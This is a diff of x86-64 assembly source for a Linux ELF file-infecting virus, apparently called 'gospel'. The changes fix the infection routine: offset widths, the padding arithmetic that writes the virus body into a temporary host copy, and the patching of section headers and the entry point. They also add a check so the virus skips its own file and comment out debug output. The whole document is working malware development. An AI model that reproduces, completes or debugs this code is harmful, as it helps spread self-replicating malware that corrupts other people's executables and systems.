@@ -295,7 +295,7 @@ targetdirlen equ $-targetdir
 evaddr: dq 0
 
 ;original section header offset
-oshoff: dd 0
+oshoff: dq 0
 
 hostentry_offset: dd 0
 hosttext_start: dd 0
@@ -451,23 +451,23 @@ _getdirents:
 ;		jne test_copy_filename
 ;	lea r13, [r14 + 200]
 ;	call _write
-
-_write:
-		xor rsi, rsi
-		mov rdx, r12
-		mov rsi, r13
-		mov rdi, STDOUT
-		mov rax, SYS_WRITE
-		syscall
-		ret
-	
-printteststr:
-		lea rsi, teststr
-		mov rdi, STDOUT
-		mov rdx, teststrlen
-		mov rax, SYS_WRITE
-		syscall
-		jmp _restore		
+;
+;_write:
+;		xor rsi, rsi
+;		mov rdx, r12
+;		mov rsi, r13
+;		mov rdi, STDOUT
+;		mov rax, SYS_WRITE
+;		syscall
+;		ret
+;	
+;printteststr:
+;		lea rsi, teststr
+;		mov rdi, STDOUT
+;		mov rdx, teststrlen
+;		mov rax, SYS_WRITE
+;		syscall
+;		jmp _restore		
 
 ;****************************************************************************************
 ;check_file:
@@ -514,11 +514,24 @@ check_file:
 		;lea r13, [rcx + r14 + 600 + linuxdirent.d_nameq]
 		;lea r13, [r14 + 200]
 		;call _write
+		mov rcx,r12
 		xor rax, rax
 		push r9
 	check_filename:
 		cmp qword [r14+200], "."
 		je checknext
+		jmp get_vx_name
+	check_vx_name:
+		pop rax
+		lea rsi, [rax]
+		cmp qword [r14+200], rsi
+		je checknext
+		jmp get_filestat
+		;mov r12, 'gospel\0'
+
+	get_vx_name:
+		call check_vx_name
+		vxname: db 'gospel\0'		
 
 	get_filestat:
 									;size for mmap == e_shoff + (e_shnum * e_shentsize)
@@ -625,7 +638,7 @@ check_file:
 		;mov r12, checkfiledtreg_fail_len
 		;lea r13, checkfile_dtreg_fail
 		;lea r13, [rcx + r14 + 600 + linuxdirent.d_nameq]
-		call _write
+		;call _write
 		
 		mov rdi, fd
 		mov rsi, [r14 + filestat.st_size]
@@ -832,7 +845,7 @@ infect:
 			jge .mod_subsequent_shdr
 			mov r11, [r13 + r15 + elf_shdr.sh_addr]
 			add dword r11d, [r13 + r15 + elf_shdr.sh_size]
-			cmp dword r11d, [vxoffset]
+			cmp dword r11d, [evaddr]
 			jne .mod_subsequent_shdr
 			mov dword r10d, [r13 + r15 + elf_shdr.sh_size]
 			add dword r10d, vlen
@@ -851,7 +864,7 @@ infect:
 	lea r10, [r13 + elf_ehdr.e_shoff]
 	mov [SHDR_OFFSET_HOST], r10
 	mov r11, [r13 + elf_ehdr.e_shoff]
-	mov dword [oshoff], r11d
+	mov qword [oshoff], r11
 	cmp dword r11d, [vxoffset]
 	jg .patch_ehdr_shoff
 	jmp fin_infect
@@ -931,7 +944,6 @@ frankenstein_elf:
 		lea rsi, [r13 + elf_ehdr]					;r13 contains pointer to mmap'd file
 		mov rax, SYS_WRITE
 		syscall
-;		jmp .write_datasegment_totemp
 	.write_virus_totemp:
 		mov rdi, r9
 		mov rdx, vlen
@@ -946,8 +958,8 @@ frankenstein_elf:
 		mov dword [r14 + 152], r8d			;address of original host entry point
 		mov byte [r14 + 154], 0xc3			;0xc3 = ret
 		lea rsi, [r14+ 150]
-		mov r10d, dword [vxoffset]
-		add r10d, dword vlen				;file offset adjusted to vxoffset+vlen
+		mov r10,  vlen						;file offset adjusted to vxoffset+vlen
+		add r10d, dword [vxoffset]
 		mov rax, SYS_PWRITE64
 		syscall
 		
@@ -967,13 +979,13 @@ frankenstein_elf:
 		mov rdx, [oshoff]
 		sub edx, dword [vxoffset]
 		lea rsi, [r13 + elf_ehdr]				;r13 contains pointer to mmap'd file
-		add rsi, qword [data_offset_original]	;adjust rsi address to point to original data segment offset of mmap'd file
+		add esi, dword [data_offset_original]	;adjust rsi address to point to original data segment offset of mmap'd file
 		mov r10d, dword [data_offset_new_padding]
 		mov rax, SYS_PWRITE64
 		syscall
-;		jmp .close_temp		
 
 	.write_patched_shdrs_totemp:
+;		mov rdi, r9
 		mov rdx, [r14 + filestat.st_size]
 		sub edx, dword [oshoff]
 		lea rsi, [r13 + elf_ehdr]
